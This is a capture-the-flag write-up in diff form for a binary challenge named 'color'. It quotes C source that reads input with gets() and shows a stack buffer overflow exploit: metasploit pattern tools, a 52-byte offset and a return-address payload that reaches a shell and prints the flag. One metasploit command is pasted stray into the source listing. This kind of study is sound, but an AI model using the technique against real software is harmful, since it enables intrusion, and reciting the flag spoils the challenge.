@@ -1,0 +1,78 @@
+Category: Binary (391)
+Difficulty: Medium
+Points: 60
+
+What's your favorite color? Would you like to share with me? Run the command: ssh color@104.131.79.111 -p 1001 (pw: guest) to tell me!
+
+Tools: gdb, metasploit
+
+After running the command and logging in, we can access the machine. First step is seeing what ls returns.
+# ls
+We can see 4 files: color  color.c  flag.txt  Makefile
+Color is an executable, color.c is it's code. Flag.txt is not accessible.
+The program doesn't seem to work with a few inputs, so let's take a look at the code.
+
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+
+    int vuln() {
+        char buf[32];
+    
+        printf("Enter your favorite color: ");
+        gets(buf);
+        
+        int good = 0;
+        for (int i = 0; buf[i]; i++) {
+            good &= buf[i] ^ buf[i];                                ;XOR isn't reversible and clearly it is something else which should be manipulated
+        }
+    
+        return good;
+    }
+
+    int main(char argc, char** argv) {
+        setresuid(getegid(), getegid(), getegid());
+        setresgid(getegid(), getegid(), getegid());
+    
+        //disable buffering.                                        ;buffering is mentioned (and disabled), could be a buffer overflow attack
+        setbuf(stdout, NULL);
+    
+        if (vuln()) {
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762            puts("Me too! That's my favorite color too!");
+            puts("You get a shell! Flag is in flag.txt");
+            system("/bin/sh");                                      ;we need to get here and access the shell
+        } else {
+            puts("Boo... I hate that color! :(");
+        }
+    }
+
+Let's get some more information about the program and jump into gdb.
+# file color
+The file is a 32-bit ELF binary.
+# gdb color
+
+We may use metasploit to generate a pattern of given length and then copy it into the terminal window in which we connected via ssh.
+# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
+After using it as program's input, we get a segmentation fault and the address we will calculate the EIP offset from.
+Metasploit may be used again.
+# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762
+
+An offset number was displayed, it tells us we need to use 52 letters. Let's open gdb and see if it'll work.
+# python -c "print('.'*52+'\xee\xee\xfe\xff')" > /tmp/input.in
+# gdb color
+> run < /tmp/input.in
+Last line displays the given address, it worked as expected.
+
+We still need an appropriate location to put it in. A perfect place would be just after the vuln() function is executed.
+> disassemble main
+0x08048657 is just a 'sub' and seems like a perfect match.
+# python -c "print('.'*52+'\x57\x86\x04\x08')" > /tmp/lulz.in
+# (cat /tmp/lulz.in ; cat) | ./color
+Without the additional cat command, we won't have time to actually use the shell.
+# cat flag.txt
+should work just fine now.
+We see the flag there:
+flag{c0lor_0f_0verf1ow}
+
+------
+Metasploit should be pre-installed on Kali, that is why I used a path. If you are using other OS or have it in a different directory, change this part.
